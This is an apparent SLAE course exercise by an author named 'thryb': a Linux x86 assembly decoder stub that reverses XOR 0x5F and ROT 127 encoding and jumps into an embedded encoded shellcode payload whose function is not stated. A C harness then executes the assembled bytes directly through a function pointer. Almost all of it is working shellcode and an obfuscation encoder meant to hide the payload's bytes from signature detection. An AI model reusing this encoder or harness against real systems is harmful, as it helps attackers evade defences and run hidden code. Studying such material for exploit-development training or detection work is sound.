/*

;
; Linux x86
; Author:  thryb
; Date:    22-08-16
; Purpose: XOR 5F & ROT 127 encoder
; ID:      SLAE-770
; Git:     https://www.github.com/thryb/SLAE-770
;

global _start
section .text
_start:

xor ebp, ebp

jmp short call_main ; jmp call pop technic

decoder:
        pop esi ; pop addr of shellcode in esi
        mov edi, esi ; saving address of Shellcode for rot
        xor ecx, ecx ; null ecx before putting leght of shellcode
        mov cl, lenght ; mov lenght of shellcode in cl (counter)

unxor:
        xor byte [esi], 0x5F ; xor byte located at esi with 5F
        jz rot_127 ; jmp if 0 (0x5F added at the end of the shellcode)
        inc esi ; inc esi to next byte
        jmp short unxor ; jmp back to unxor

rot_127:
        cmp byte [edi], 0x7F ; compare byte at edi with 0x7F
        jl short low ; if jmp low if less
        sub byte [edi], 0x7F ; if higher subtract 0x7F
        jmp short norm ; jmp to common instructions

low:
        xor ebx, ebx ; null ebx
        xor edx, edx ; nul edx
        mov bl, 0x7F ; put 0x7F in bl
        mov dl, 0xFF ; put 0xFF in dl
        inc dx ; inc DX to get 256 (0x0100)
        sub bl, byte [edi] ; substract byte at edi from from 7F
        sub dx, bx ; substract dx from 256
        mov byte [edi], dl ; mov byte at dl into edi

norm:
        inc edi ; increment edi to go to next byte
        loop rot_127 ; loop back to rot_127 & decrement cl
        jmp short shellcode ; jmp to unxor derotted shellcode

call_main:
        call decoder ; jmp call pop technic
        shellcode: db 0xee,0x0e,0xef,0x2a,0xef,0x21,0xef,0x60,0xef,0x05,0x90,0xb6,0xdf,0xb6,0xde,0x70,0xba,0x6d,0xdf,0x57,0x3f,0x13,0xa0,0x4a,0x70,0xba,0x5d,0x1d,0xde,0xb8,0xa1,0x21,0x21,0x31,0xba,0xb8,0xfd,0x5e,0xba,0xb6,0xde,0x57,0x3f,0xb6,0xd0,0x8f,0x8a,0x57,0x3f,0x13,0xa0,0x4a,0xef,0x17,0xa0,0x1f,0xde,0x70,0xe1,0x13,0xa0,0x22,0x17,0xa7,0x28,0x90,0xb8,0xf1,0xa6,0xad,0xb8,0xb8,0xf1,0xbe,0xb7,0xb2,0x57,0x3d,0x90,0x8d,0x57,0x3f,0x70,0xd5,0x13,0xa0,0x5f
        lenght: equ $-shellcode ; define lenght of shellcode


*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \

	"\x31\xed\xeb\x2f\x5e\x89\xf7\x31\xc9\xb1\x57\x80\x36\x5f\x74\x03\x46\xeb\xf8\x80"
	"\x3f\x7f\x7c\x05\x80\x2f\x7f\xeb\x11\x31\xdb\x31\xd2\xb3\x7f\xb2\xff\x66\x42\x2a"
	"\x1f\x66\x29\xda\x88\x17\x47\xe2\xe2\xeb\x05\xe8\xcc\xff\xff\xff\xee\x0e\xef\x2a"
	"\xef\x21\xef\x60\xef\x05\x90\xb6\xdf\xb6\xde\x70\xba\x6d\xdf\x57\x3f\x13\xa0\x4a"
	"\x70\xba\x5d\x1d\xde\xb8\xa1\x21\x21\x31\xba\xb8\xfd\x5e\xba\xb6\xde\x57\x3f\xb6"
	"\xd0\x8f\x8a\x57\x3f\x13\xa0\x4a\xef\x17\xa0\x1f\xde\x70\xe1\x13\xa0\x22\x17\xa7"
	"\x28\x90\xb8\xf1\xa6\xad\xb8\xb8\xf1\xbe\xb7\xb2\x57\x3d\x90\x8d\x57\x3f\x70\xd5\x13\xa0\x5f";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;ret();
}
